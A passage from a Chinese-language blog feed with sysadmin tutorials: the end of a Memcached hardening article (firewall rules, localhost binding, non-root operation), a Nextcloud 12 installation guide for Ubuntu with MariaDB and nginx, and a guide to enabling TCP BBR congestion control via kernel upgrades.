title="配置访问控制。"></a>配置访问控制。</h3><p>建议用户不要将服务发布到互联网上而被黑客利用，可以通过ECS安全组规则或IPtables配置访问控制规则。<br>例如，在Linux环境中运行命令<code>iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT</code>，在IPtables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问。</p><h3 id="绑定监听IP。"><a href="#绑定监听IP。" class="headerlink" title="绑定监听IP。"></a>绑定监听IP。</h3><p>如果Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为 127.0.0.1。例如，在Linux环境中运行以下命令：</p><pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></pre><h3 id="最小化权限运行。"><a href="#最小化权限运行。" class="headerlink" title="最小化权限运行。"></a>最小化权限运行。</h3><p>使用普通权限账号运行，指定Memcached用户。例如，在Linux环境中运行以下命令来运行Memcached：</p><pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></pre><h3 id="修改默认端口。"><a href="#修改默认端口。" class="headerlink" title="修改默认端口。"></a>修改默认端口。</h3><p>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：</p><pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></pre><p>Memcached命令参数说明</p><pre><code>-d 是指启动一个守护进程。-m 是指分配给Memcached使用的内存数量，单位是MB，以上为1024MB。-u 是指运行Memcached的用户，推荐使用单独普通权限用户memcached，而不要使用root权限账户。-l 是指监听的服务器IP地址，例如指定服务器的IP地址为127.0.0.1。-p 是用来设置Memcached的监听端口，默认端口为11211。建议设置1024以上的端口。-c 是指最大运行的并发连接数，默认是1024。可按照您服务器的负载量来设定。-P 是指设置保存Memcached的pid文件，例如保存在 /tmp/memcached.pid 位置。</code></pre><p><strong>文章参考</strong><br><a href="https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/" target="_blank" rel="noopener">https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu server 安装nextcloud12</title>
    <link href="/2018/02/21/2018-02-21-install-nextcloud12-on-ubuntu/"/>
    <url>/2018/02/21/2018-02-21-install-nextcloud12-on-ubuntu/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-server-安装nextcloud12"><a href="#ubuntu-server-安装nextcloud12" class="headerlink" title="ubuntu server 安装nextcloud12"></a>ubuntu server 安装nextcloud12</h1><hr><h2 id="1-更新系统安装必要的依赖包"><a href="#1-更新系统安装必要的依赖包" class="headerlink" title="1.更新系统安装必要的依赖包"></a>1.更新系统安装必要的依赖包</h2><pre><code class="hljs routeros">[user]$ sudo apt-<span class="hljs-builtin-name">get</span> update &amp;&amp; sudo apt-<span class="hljs-builtin-name">get</span> -y upgrade[user]$ sudo apt-<span class="hljs-builtin-name">get</span> install software-properties-common nano wget</code></pre><h2 id="2-安装MariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询"><a href="#2-安装MariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询" class="headerlink" title="2.安装ＭariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询"></a>2.安装ＭariaDB10以上版本，如果不清楚安装的版本是否符合nextcloud要求，可以到官网上查询</h2><p>nextcloud官网：<a href="https://nextcloud.com/install/#" target="_blank" rel="noopener">https://nextcloud.com/install/#</a><br>MariaDB安装与配置:</p><pre><code class="hljs pgsql">[<span class="hljs-keyword">user</span>]$ sudo apt-<span class="hljs-keyword">get</span> install -y mariadb-<span class="hljs-keyword">server</span></code></pre><p>安装完毕以后，运行：</p><pre><code class="hljs cs">[<span class="hljs-meta">user</span>]$ mysql_secure_installation</code></pre><p>这个的主要目的是更新和配置数据库，同时设置相应的root密码，我在安装的时候遇到一个问题就是在普通用户下无法成功连接到数据库，需要切换到root进行，目前没有解决这个问题，如果哪位大佬可以解决，请给我留言．<br>重启ＭariaDB服务：</p><pre><code class="hljs routeros">[user]$ sudo<span class="hljs-built_in"> service </span>mysql restart</code></pre><p>登录数据库并且创建相应的数据库</p><pre><code class="hljs cs">[<span class="hljs-meta">user</span>]$ mysql -uroot -p</code></pre><p>***注意这一步如果登录失败，请切换root用户执行<br>创建数据库：</p><pre><code class="hljs pgsql">MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> nextcloud;MariaDB [(<span class="hljs-keyword">none</span>)]&gt; <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> nextcloud.* <span class="hljs-keyword">TO</span> <span class="hljs-string">'nextcloud'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'strong_password'</span>;MariaDB [(<span class="hljs-keyword">none</span>)]&gt; FLUSH <span class="hljs-keyword">PRIVILEGES</span>;MariaDB [(<span class="hljs-keyword">none</span>)]&gt; \q</code></pre><h2 id="3-安装php"><a href="#3-安装php" class="headerlink" title="3.安装php"></a>3.安装php</h2><pre><code class="hljs pgsql">[<span class="hljs-keyword">user</span>]$ sudo apt-<span class="hljs-keyword">get</span> -y install php-fpm php-cli php-<span class="hljs-type">json</span> php-curl php-imap php-gd php-mysql php-<span class="hljs-type">xml</span> php-zip php-intl php-mcrypt php-imagick php-mbstring</code></pre><p>这里设置的<strong>php memory</strong>为512MB，<strong>upload_max_filesize</strong> 和 <strong>post_max_size</strong> 为200MB</p><pre><code class="hljs dts">[user]$ sed -i <span class="hljs-string">"s/memory_limit = .*/memory_limit = 512M/"</span> <span class="hljs-meta-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-meta-keyword">/fpm/</span>php.ini[user]$ sed -i <span class="hljs-string">"s/;date.timezone.*/date.timezone = UTC/"</span> <span class="hljs-meta-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-meta-keyword">/fpm/</span>php.ini[user]$ sed -i <span class="hljs-string">"s/;cgi.fix_pathinfo=1/cgi.fix_pathinfo=1/"</span> <span class="hljs-meta-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-meta-keyword">/fpm/</span>php.ini[user]$ sed -i <span class="hljs-string">"s/upload_max_filesize = .*/upload_max_filesize = 200M/"</span> <span class="hljs-meta-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-meta-keyword">/fpm/</span>php.ini[user]$ sed -i <span class="hljs-string">"s/post_max_size = .*/post_max_size = 200M/"</span> <span class="hljs-meta-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-meta-keyword">/fpm/</span>php.ini</code></pre><p><strong>*配置文件的位置</strong>：</p><pre><code class="hljs dts"><span class="hljs-symbol">php:</span><span class="hljs-meta-keyword">/etc/</span>php/<span class="hljs-number">7.0</span><span class="hljs-meta-keyword">/fpm/</span>php.ini</code></pre><p>配置<strong>PHP-FPM</strong><br>配置文件使用默认的就好，如果有问题，请参考下面关于环境变量的配置</p><pre><code class="hljs awk">[user]$ sudo vim <span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.0/</span>fpm<span class="hljs-regexp">/pool.d/</span>www.conf</code></pre><p><strong>环境变量</strong>：</p><pre><code class="hljs ini"><span class="hljs-attr">env[HOSTNAME]</span> = <span class="hljs-variable">$HOSTNAME</span><span class="hljs-attr">env[PATH]</span> = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<span class="hljs-attr">env[TMP]</span> = /tmp<span class="hljs-attr">env[TMPDIR]</span> = /tmp<span class="hljs-attr">env[TEMP]</span> = /tmp</code></pre><p>重启<strong>PHP-FPM</strong>服务：</p><pre><code class="hljs routeros">[user]$ sudo<span class="hljs-built_in"> service </span>php7.0-fpm restart</code></pre><h2 id="4-下载并且安装NextCloud12"><a href="#4-下载并且安装NextCloud12" class="headerlink" title="4.下载并且安装ＮextCloud12"></a>4.下载并且安装ＮextCloud12</h2><p>这里将Nextcloud安装到<strong>/var/www/nextcloud/</strong>目录下，安装目录根据个人爱好就行</p><pre><code class="hljs cs">[<span class="hljs-meta">user</span>]$ wget https:<span class="hljs-comment">//download.nextcloud.com/server/releases/nextcloud-12.0.0.zip</span>[<span class="hljs-meta">user</span>]$ unzip nextcloud<span class="hljs-number">-12.0</span><span class="hljs-number">.0</span>.zip[<span class="hljs-meta">user</span>]$ sudo mkdir /<span class="hljs-keyword">var</span>/www/[<span class="hljs-meta">user</span>]$ sudo mv nextcloud /<span class="hljs-keyword">var</span>/www/[<span class="hljs-meta">user</span>]$ rm -f nextcloud<span class="hljs-number">-12.0</span><span class="hljs-number">.0</span>.zip[<span class="hljs-meta">user</span>]$ sudo chown -R www-data: /<span class="hljs-keyword">var</span>/www/nextcloud</code></pre><h2 id="5-安装和配置nginx"><a href="#5-安装和配置nginx" class="headerlink" title="5.安装和配置nginx"></a>5.安装和配置nginx</h2><pre><code class="hljs cs">[<span class="hljs-meta">user</span>]$ sudo apt-<span class="hljs-keyword">get</span> install nginx-extras nginx</code></pre><h2 id="6-这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置-etc-nginx-ssl目录下，如果是新手，请注意证书的名字"><a href="#6-这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置-etc-nginx-ssl目录下，如果是新手，请注意证书的名字" class="headerlink" title="6.这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置/etc/nginx/ssl目录下，如果是新手，请注意证书的名字"></a>6.这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置/etc/nginx/ssl目录下，如果是新手，请注意证书的名字</h2><pre><code class="hljs sas">[user]$ sudo mkdir -p /etc/nginx/ssl[user]$ cd /etc/nginx/ssl[user]$ sudo openssl genrsa -des3 -passout pass:<span class="hljs-meta">x</span> -<span class="hljs-meta">out</span> nextcloud.pass.<span class="hljs-meta">key</span> 2048[user]$ sudo openssl rsa -passin pass:<span class="hljs-meta">x</span> -<span class="hljs-meta">in</span> nextcloud.pass.<span class="hljs-meta">key</span> -<span class="hljs-meta">out</span> nextcloud.<span class="hljs-meta">key</span>[user]$ sudo rm nextcloud.pass.<span class="hljs-meta">key</span>[user]$ sudo openssl req -new -<span class="hljs-meta">key</span> nextcloud.<span class="hljs-meta">key</span> -<span class="hljs-meta">out</span> nextcloud.csr[user]$ sudo openssl x509 -req -days 365 -<span class="hljs-meta">in</span> nextcloud.csr -signkey nextcloud.<span class="hljs-meta">key</span> -<span class="hljs-meta">out</span> nextcloud.crt</code></pre><h2 id="7-为nginx服务器创建相应的配置文件："><a href="#7-为nginx服务器创建相应的配置文件：" class="headerlink" title="7.为nginx服务器创建相应的配置文件："></a>7.为nginx服务器创建相应的配置文件：</h2><pre><code class="hljs awk">[user]$ sudo nano <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-available/</span>nextcloud</code></pre><p>文件内容：</p><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;    <span class="hljs-attribute">server_name</span> my.nextcloud.com;    <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$request_uri</span>;&#125;<span class="hljs-section">server</span> &#123;    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl http2;    <span class="hljs-attribute">server_name</span> my.nextcloud.com;    <span class="hljs-attribute">root</span> /var/www/nextcloud;    <span class="hljs-attribute">ssl</span> <span class="hljs-literal">on</span>;    <span class="hljs-attribute">ssl_certificate</span>     /etc/nginx/ssl/nextcloud.crt;    <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl/nextcloud.key;    <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">5m</span>;    <span class="hljs-attribute">ssl_ciphers</span>               <span class="hljs-string">'AES128+EECDH:AES128+EDH:!aNULL'</span>;    <span class="hljs-attribute">ssl_protocols</span>              TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;    <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;    <span class="hljs-attribute">add_header</span> X-Content-Type-Options nosniff;    <span class="hljs-attribute">add_header</span> X-Frame-Options <span class="hljs-string">"SAMEORIGIN"</span>;    <span class="hljs-attribute">add_header</span> X-XSS-Protection <span class="hljs-string">"1; mode=block"</span>;    <span class="hljs-attribute">add_header</span> X-Robots-Tag <span class="hljs-literal">none</span>;    <span class="hljs-attribute">add_header</span> X-Download-Options noopen;    <span class="hljs-attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="hljs-literal">none</span>;    <span class="hljs-attribute">access_log</span>  /var/log/nginx/nextcloud.access.log;    <span class="hljs-attribute">error_log</span>   /var/log/nginx/nextcloud.<span class="hljs-literal">error</span>.log;    <span class="hljs-attribute">location</span> = /robots.txt &#123;        <span class="hljs-attribute">allow</span> all;        <span class="hljs-attribute">log_not_found</span> <span class="hljs-literal">off</span>;        <span class="hljs-attribute">access_log</span> <span class="hljs-literal">off</span>;    &#125;    <span class="hljs-attribute">location</span> = /.well-known/carddav &#123;         <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>/remote.php/dav;     &#125;    <span class="hljs-attribute">location</span> = /.well-known/caldav &#123;         <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>/remote.php/dav;     &#125;    <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">512M</span>;    <span class="hljs-attribute">fastcgi_buffers</span> <span class="hljs-number">64</span> <span class="hljs-number">4K</span>;    <span class="hljs-attribute">gzip</span> <span class="hljs-literal">off</span>;    <span class="hljs-attribute">error_page</span> <span class="hljs-number">403</span> /core/templates/<span class="hljs-number">403</span>.php;    <span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> /core/templates/<span class="hljs-number">404</span>.php;    <span class="hljs-attribute">location</span> / &#123;        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^</span> /index.php<span class="hljs-variable">$uri</span>;    &#125;    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ ^/(?:build|tests|config|lib|3rdparty|templates|data)/</span> &#123;        <span class="hljs-attribute">deny</span> all;    &#125;    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ ^/(?:\.|autotest|occ|issue|indie|db_|console)</span> &#123;        <span class="hljs-attribute">deny</span> all;    &#125;    <span class="hljs-attribute">location</span> ~^/(?:index|remote|public|cron|core/ajax/update|status|ocs/v[<span class="hljs-number">12</span>]|updater/.+|ocs-provider/.+|core/templates/<span class="hljs-number">40</span>[<span class="hljs-number">34</span>])\.php(?:$|/) &#123;        <span class="hljs-attribute">include</span> fastcgi_params;        <span class="hljs-attribute">fastcgi_split_path_info</span><span class="hljs-regexp"> ^(.+\.php)(/.+)$</span>;        <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;        <span class="hljs-attribute">fastcgi_param</span> PATH_INFO <span class="hljs-variable">$fastcgi_path_info</span>;        <span class="hljs-attribute">fastcgi_param</span> HTTPS <span class="hljs-literal">on</span>;        <span class="hljs-comment">#Avoid sending the security headers twice</span>        <span class="hljs-attribute">fastcgi_param</span> modHeadersAvailable <span class="hljs-literal">true</span>;        <span class="hljs-attribute">fastcgi_param</span> front_controller_active <span class="hljs-literal">true</span>;        <span class="hljs-attribute">fastcgi_pass</span> unix:/var/run/php/php7.0-fpm.sock;        <span class="hljs-attribute">fastcgi_intercept_errors</span> <span class="hljs-literal">on</span>;        <span class="hljs-attribute">fastcgi_request_buffering</span> <span class="hljs-literal">off</span>;    &#125;    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ ^/(?:updater|ocs-provider)(?:$|/)</span> &#123;        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;        <span class="hljs-attribute">index</span> index.php;    &#125;    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~* \.(?:css|js)$</span> &#123;        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> /index.php<span class="hljs-variable">$uri</span><span class="hljs-variable">$is_args</span><span class="hljs-variable">$args</span>;        <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">"public, max-age=7200"</span>;        <span class="hljs-attribute">add_header</span> X-Content-Type-Options nosniff;        <span class="hljs-attribute">add_header</span> X-Frame-Options <span class="hljs-string">"SAMEORIGIN"</span>;        <span class="hljs-attribute">add_header</span> X-XSS-Protection <span class="hljs-string">"1; mode=block"</span>;        <span class="hljs-attribute">add_header</span> X-Robots-Tag <span class="hljs-literal">none</span>;        <span class="hljs-attribute">add_header</span> X-Download-Options noopen;        <span class="hljs-attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="hljs-literal">none</span>;        <span class="hljs-comment"># Optional: Don't log access to assets</span>        <span class="hljs-attribute">access_log</span> <span class="hljs-literal">off</span>;    &#125;    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~* \.(?:svg|gif|png|html|ttf|woff|ico|jpg|jpeg)$</span> &#123;        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> /index.php<span class="hljs-variable">$uri</span><span class="hljs-variable">$is_args</span><span class="hljs-variable">$args</span>;        <span class="hljs-attribute">access_log</span> <span class="hljs-literal">off</span>;    &#125;    <span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /\.ht</span> &#123;        <span class="hljs-attribute">deny</span> all;    &#125;&#125;</code></pre><p><strong>*注意：这里需要更改相应的域名，不要直接复制</strong><br>链接相应的配置文件：</p><pre><code class="hljs awk">[user]$ sudo ln -s <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-available/</span>nextcloud <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>nextcloud</code></pre><p>重启nginx服务：</p><pre><code class="hljs routeros">[user]$ sudo nginx -t[user]$ sudo<span class="hljs-built_in"> service </span>nginx restart</code></pre><h2 id="8-到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置："><a href="#8-到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置：" class="headerlink" title="8.到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置："></a>8.到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置：</h2><p>打开浏览器输入：<a href="https://my.nextcloud.com/install.php" target="_blank" rel="noopener">https://my.nextcloud.com/install.php</a></p><blockquote><p>注意这里设置的域名，如果没有设置域名，在相同的网段下使用ＩＰ进行访问，我这里在同一个路由下访问nextcloud,主机的ip为192.168.1.105，怎么查看自己主机的ip方法有很多，命令也行，路由也行，怎么方便怎么来．<br><strong><a href="https://192.168.1.105/install.php" target="_blank" rel="noopener">https://192.168.1.105/install.php</a></strong></p></blockquote><p>打开网页后，设置相应的管理员用户名和密码及相应的文件存储位置，这个位置可以随便设置，但是需要更改位置的组和拥有者为<strong>www-data</strong>,</p><p><strong>*注意</strong>：上传和下载大文件时可能会提示文件太大，需要更改上传和下载文件最大限制：</p><p>配置文件需要修改：</p><ol><li><p>/etc/php/7.0/fpm/php.ini　</p> <pre><code class="hljs abnf">php memory<span class="hljs-comment">;</span>upload_max_filesize<span class="hljs-comment">;</span>post_max_size<span class="hljs-comment">;</span></code></pre></li><li><p>/etc/nginx/sites-available/nextcloud</p> <pre><code class="hljs abnf">client_max_body_size<span class="hljs-comment">;</span></code></pre></li><li><p>/var/www/nextcloud/.htaccess</p> <pre><code class="hljs abnf">php_value upload_max_filesize<span class="hljs-comment">; </span>php_value post_max_size<span class="hljs-comment">;</span>php_value memory_limit<span class="hljs-comment">;</span></code></pre></li></ol><p><strong>*具体大小根据个人情况设置</strong></p><p>配置完成以后重启相应的服务：</p><pre><code class="hljs smali">sudo<span class="hljs-keyword"> system</span>ctl restart php7.0-fpm sudo<span class="hljs-keyword"> system</span>ctl restart nginx</code></pre>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开启TCP BBR拥塞控制算法</title>
    <link href="/2018/02/20/2018-02-20-open-bbr-services/"/>
    <url>/2018/02/20/2018-02-20-open-bbr-services/</url>
    
    <content type="html"><![CDATA[<p>BBR 目的是要尽量跑满带宽, 并且尽量不要有排队的情况, 效果并不比速锐差</p><p>Linux kernel 4.9+ 已支持 tcp_bbr 下面简单讲述基于KVM架构VPS如何开启  </p><p>附:<br><a href="https://www.91yun.org/archives/4996" target="_blank" rel="noopener">OpenVZ 架构VPS开启BBR</a>  （容易导致判定滥用ban机，慎用！)</p><p><a href="https://moeclub.org/2017/06/24/278/" target="_blank" rel="noopener">Debian/Ubuntu TCP BBR 魔改版</a></p><h2 id="Debian-8-Ubuntu-14"><a href="#Debian-8-Ubuntu-14" class="headerlink" title="Debian 8+ / Ubuntu 14"></a>Debian 8+ / Ubuntu 14</h2><ul><li><p>下载最新内核,最新内核查看<a href="http://kernel.ubuntu.com/~kernel-ppa/mainline" target="_blank" rel="noopener">这里</a>  </p><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>kernel.ubuntu.com<span class="hljs-regexp">/~kernel-ppa/m</span>ainline<span class="hljs-regexp">/v4.14.12/</span>linux-image-<span class="hljs-number">4.14</span>.<span class="hljs-number">12</span>-<span class="hljs-number">041412</span>-generic_4.<span class="hljs-number">14.12</span>-<span class="hljs-number">041412.201801051649</span>_amd64.deb</code></pre></li><li><p>安装内核</p><pre><code class="hljs nginx"><span class="hljs-attribute">dpkg</span> -i linux-image-<span class="hljs-number">4</span>.<span class="hljs-regexp">*.deb</span></code></pre></li><li><p>删除旧内核(可选)</p><pre><code class="hljs arduino">dpkg -l | grep linux-<span class="hljs-built_in">image</span> apt-<span class="hljs-built_in">get</span> purge 旧内核</code></pre></li><li><p>更新 grub 系统引导文件并重启</p><pre><code class="hljs ebnf"><span class="hljs-attribute">update-grub</span><span class="hljs-attribute">reboot</span></code></pre></li></ul><h2 id="Ubuntu-16-04"><a href="#Ubuntu-16-04" class="headerlink" title="Ubuntu 16.04"></a>Ubuntu 16.04</h2><p>安装 Hardware Enablement Stack (HWE)，自动更新内核</p><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> --<span class="hljs-keyword">install</span>-recommends linux-generic-hwe-<span class="hljs-number">16.04</span></code></pre><ul><li>删除旧内核(可选)<pre><code class="hljs angelscript">apt <span class="hljs-built_in">auto</span>remove</code></pre></li></ul><h2 id="CentOS-6"><a href="#CentOS-6" class="headerlink" title="CentOS 6"></a>CentOS 6</h2><ul><li><p>下载更换内核<br>最新内核查看<a href="http://elrepo.org/linux/kernel/el6/x86_64/RPMS/" target="_blank" rel="noopener">这里</a></p><pre><code class="hljs groovy">rpm --<span class="hljs-keyword">import</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.elrepo.org/RPM-GPG-KEY-elrepo.org</span>rpm -Uvh <span class="hljs-string">http:</span><span class="hljs-comment">//www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm</span>yum --enablerepo=elrepo-kernel install kernel-ml -y</code></pre></li><li><p>查看内核是否安装成功  </p><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> kernel</code></pre></li><li><p>删除旧内核(可选)  </p><pre><code class="hljs maxima">rpm -<span class="hljs-built_in">ev</span> 旧内核</code></pre></li><li><p>更新 grub 系统引导文件并重启</p><pre><code class="hljs fsharp">sed -i <span class="hljs-symbol">'s</span>:<span class="hljs-keyword">default</span>=.*:<span class="hljs-keyword">default</span>=<span class="hljs-number">0</span>:g' /etc/grub.confreboot</code></pre><p>开不了机的打开 vps 后台控制面板的 vnc, 开机卡在 grub 引导, 只需要手动选择内核就可以了</p></li></ul><p>安装完成后不要忘记修改 /boot/grub/menu.lst 和 /etc/grub.conf，将这两个文件中旧内核的启动项删除即可避免无法重启的问题。</p><ul><li>更新到最新版内核 <pre><code class="hljs routeros">yum <span class="hljs-attribute">--enablerepo</span>=elrepo-kernel update -y reboot</code></pre></li></ul><h2 id="CentOS-7"><a href="#CentOS-7" class="headerlink" title="CentOS 7"></a>CentOS 7</h2><ul><li><p>下载更换内核<br>最新内核查看<a href="http://elrepo.org/linux/kernel/el7/x86_64/RPMS/" target="_blank" rel="noopener">这里</a></p><pre><code class="hljs groovy">rpm --<span class="hljs-keyword">import</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.elrepo.org/RPM-GPG-KEY-elrepo.org</span>rpm -Uvh <span class="hljs-string">http:</span><span class="hljs-comment">//www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span>yum --enablerepo=elrepo-kernel install kernel-ml -y</code></pre></li><li><p>查看内核是否安装成功  </p><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> kernel</code></pre></li><li><p>删除旧内核(可选)  </p><pre><code class="hljs maxima">rpm -<span class="hljs-built_in">ev</span> 旧内核</code></pre></li><li><p>更新 grub 系统引导文件并重启</p><pre><code class="hljs lsl">egrep ^menuentry /etc/grub2.cfg | cut -f <span class="hljs-number">2</span> -d \'grub2-set-<span class="hljs-section">default</span> <span class="hljs-number">0</span>  # <span class="hljs-section">default</span> <span class="hljs-number">0</span> 表示第一个内核设置为默认运行, 选择最新内核就对了reboot</code></pre></li><li><p>注意，某些服务商（如 <a href="https://www.digitalocean.com/community/tutorials/how-to-update-a-digitalocean-server-s-kernel" target="_blank" rel="noopener">Digital Ocean</a>）可能需要首先将 VPS 配置为可自定义内核，然后 grub2 的配置才会生效。</p></li></ul><p>重新启动后，如果会出现 “read-only file system” 的错误，root账户下执行 <code>mount -o remount rw /</code> 即可</p><ul><li>更新到最新版内核 </li></ul><p>方法同 CentOS 6</p><h2 id="开启bbr"><a href="#开启bbr" class="headerlink" title="开启bbr"></a>开启bbr</h2><p>开机后 <code>uname -r</code> 看看是不是内核 &gt;= 4.9  </p><p>执行 <code>lsmod | grep bbr</code>，如果结果中没有 <code>tcp_bbr</code> 的话就先执行</p><pre><code class="hljs jboss-cli">modprobe tcp_bbr<span class="hljs-keyword">echo</span> <span class="hljs-string">"tcp_bbr"</span> &gt;&gt; <span class="hljs-string">/etc/modules-load.d/modules.conf</span></code></pre><p>执行</p><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> <span class="hljs-string">"net.core.default_qdisc=fq"</span> &gt;&gt; <span class="hljs-string">/etc/sysctl.conf</span><span class="hljs-keyword">echo</span> <span class="hljs-string">"net.ipv4.tcp_congestion_control=bbr"</span> &gt;&gt; <span class="hljs-string">/etc/sysctl.conf</span></code></pre><p>保存生效<br><code>sysctl -p</code>  </p><p>执行  </p><pre><code class="hljs css"><span class="hljs-selector-tag">sysctl</span> <span class="hljs-selector-tag">net</span><span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_available_congestion_control</span><span class="hljs-selector-tag">sysctl</span> <span class="hljs-selector-tag">net</span><span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_congestion_control</span></code></pre><p>如果结果都有 <code>bbr</code>, 则证明你的内核已开启 bbr  </p><p>执行 <code>lsmod | grep bbr</code>, 看到有 tcp_bbr 模块即说明 bbr 已启动  </p><hr><p>文章转载自：<a href="https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AFTCP-BBR%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AFTCP-BBR%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95</a></p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KaliLinux 安装Nvidia闭源驱动</title>
    <link href="/2018/01/09/2018-01-10-kali-install-nvidia-driver/"/>
    <url>/2018/01/09/2018-01-10-kali-install-nvidia-driver/</url>
    
